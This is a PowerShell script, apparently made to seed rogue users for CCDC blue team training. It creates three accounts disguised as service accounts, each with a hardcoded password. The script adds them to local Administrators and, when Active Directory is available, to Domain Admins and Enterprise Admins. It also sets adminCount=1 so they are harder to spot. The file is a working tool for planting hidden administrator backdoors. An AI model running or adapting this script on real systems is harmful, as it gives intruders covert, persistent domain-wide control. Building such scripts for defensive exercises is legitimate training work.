# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC User Injection
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# THIS SCRIPT PUTS ROGUE USERS IN THE DEVICE
#
# Step 1 (always): creates local users and adds them to the local
#                  Administrators group.
# Step 2 (optional): if an AD domain controller is reachable and the
#                    ActiveDirectory module is available, also creates the
#                    same users as domain accounts in Domain Admins /
#                    Administrators / Enterprise Admins.
#
# NOTE: #Requires -Modules ActiveDirectory is intentionally OMITTED.
#       That directive terminates the entire PowerShell session when the
#       module is absent.  We import it manually below and skip AD work
#       gracefully if it isn't present.
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

# -- Colour helpers ------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

Write-Host ""
Write-Warn  "========================================================"
Write-Warn  " CCDC Blue Team Training  -  Rogue User Injector"
Write-Warn  "========================================================"
Write-Host ""

# -- User definitions ----------------------------------------------------------
# Format: SamAccountName, DisplayName, Password, Description (disguise text)
$EvilUsers = @(
    [PSCustomObject]@{
        Sam         = "JohnRedTeam"
        DisplayName = "John"
        Password    = "S1llyEv1l@2024!"
        Description = "FUCK DONT KILL ME"
    },
    [PSCustomObject]@{
        Sam         = "AdobeAcrobat"
        DisplayName = "AdobeAcrobat"
        Password    = "R3m0veM3@2024!"
        Description = "Service Account"
    },
    [PSCustomObject]@{
        Sam         = "KayneWhitney"
        DisplayName = "Kayne"
        Password    = "F@keUs3r@2024!"
        Description = "Exchange migration service account"
    }
)

# =============================================================================
# STEP 1: Local users  (no AD required — works on any Windows machine)
# =============================================================================
Write-Section "LOCAL USER CREATION"

foreach ($u in $EvilUsers) {

    Write-Info "Processing local user: $($u.Sam) ..."
    $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force

    $existingLocal = Get-LocalUser -Name $u.Sam -ErrorAction SilentlyContinue
    if ($existingLocal) {
        Write-Warn "  Local user '$($u.Sam)' already exists  -  skipping creation."
    } else {
        try {
            New-LocalUser `
                -Name                 $u.Sam `
                -Password             $SecurePass `
                -FullName             $u.DisplayName `
                -Description          $u.Description `
                -PasswordNeverExpires:$true `
                -ErrorAction          Stop
            Write-Success "  Created local user : $($u.Sam)"
            Write-Success "  Password           : $($u.Password)"
        } catch {
            Write-Err "  Failed to create local user '$($u.Sam)': $_"
            continue
        }
    }

    # Add to local Administrators group
    try {
        Add-LocalGroupMember -Group "Administrators" -Member $u.Sam -ErrorAction Stop
        Write-Success "  Added to local Administrators group."
    } catch {
        if ($_ -match "already a member") {
            Write-Warn "  '$($u.Sam)' is already in local Administrators."
        } else {
            Write-Err "  Failed to add '$($u.Sam)' to local Administrators: $_"
        }
    }

    Write-Host ""
}

# =============================================================================
# STEP 2: AD users  (optional — skipped gracefully if AD is unavailable)
# =============================================================================
Write-Section "ACTIVE DIRECTORY USER CREATION (optional)"

$adAvailable = $false
$DomainDN    = $null
$DomainName  = $null

try {
    Import-Module ActiveDirectory -ErrorAction Stop
    $adDomain   = Get-ADDomain -ErrorAction Stop
    $DomainDN   = $adDomain.DistinguishedName   # e.g. DC=corp,DC=local
    $DomainName = $adDomain.DNSRoot             # e.g. corp.local
    $adAvailable = $true
    Write-Info "Domain detected: $DomainName  ($DomainDN)"
} catch {
    Write-Warn "AD module or domain not available  -  skipping AD user creation."
    Write-Warn "Reason: $_"
    Write-Info "Local users were created successfully in Step 1."
}

if ($adAvailable) {

    $UsersOU     = "CN=Users,$DomainDN"
    $AdminGroups = @(
        "Domain Admins",
        "Administrators",
        "Enterprise Admins"
    )

    foreach ($u in $EvilUsers) {

        Write-Info "Processing AD user: $($u.Sam) ..."
        $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
        $UPN        = "$($u.Sam)@$DomainName"

        # -- Create the AD user ------------------------------------------------
        $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Warn "  AD user '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
        } else {
            try {
                New-ADUser `
                    -SamAccountName       $u.Sam `
                    -UserPrincipalName    $UPN `
                    -Name                 $u.DisplayName `
                    -DisplayName          $u.DisplayName `
                    -GivenName            $u.Sam `
                    -Surname              "Training" `
                    -Description          $u.Description `
                    -Path                 $UsersOU `
                    -AccountPassword      $SecurePass `
                    -Enabled              $true `
                    -PasswordNeverExpires $true `
                    -CannotChangePassword $false `
                    -ErrorAction          Stop

                Write-Success "  Created AD user : $($u.Sam)"
                Write-Success "  UPN             : $UPN"
                Write-Success "  Password        : $($u.Password)"
            } catch {
                Write-Err "  Failed to create AD user '$($u.Sam)': $_"
                continue
            }
        }

        # -- Add to domain admin groups ----------------------------------------
        foreach ($group in $AdminGroups) {
            try {
                Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
                Write-Success "  Added to group: $group"
            } catch {
                if ($group -eq "Enterprise Admins") {
                    Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
                } else {
                    Write-Err "  Failed to add '$($u.Sam)' to '$group': $_"
                }
            }
        }

        # -- Extra persistence: adminCount=1 -----------------------------------
        # Removes the account from normal ACL inheritance — harder to spot and
        # restrict via standard tooling.
        try {
            Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
            Write-Success "  adminCount set to 1 (SDProp protection bypass)"
        } catch {
            Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
        }

        Write-Host ""
    }
}

Write-Section "DONE"
Write-Host ""
Write-Info "Summary:"
foreach ($u in $EvilUsers) {
    Write-Host "  $($u.Sam.PadRight(20)) local admin" -ForegroundColor Green -NoNewline
    if ($adAvailable) { Write-Host " + AD Domain Admin" -ForegroundColor Green } else { Write-Host "" }
}
Write-Host ""
